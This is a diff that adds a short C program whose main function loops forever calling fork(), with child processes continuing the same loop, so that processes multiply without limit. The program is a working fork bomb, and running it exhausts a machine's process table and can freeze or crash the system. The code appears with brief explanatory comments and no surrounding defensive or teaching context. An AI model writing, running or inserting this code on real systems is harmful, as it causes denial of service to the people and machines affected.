@@ -1,0 +1,15 @@
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+    while (1) {
+        pid_t pid = fork(); // Create a new process
+
+        if (pid == 0) {
+            // Child process: Immediately fork again
+            continue;
+        }
+    }
+    return 0;
+}
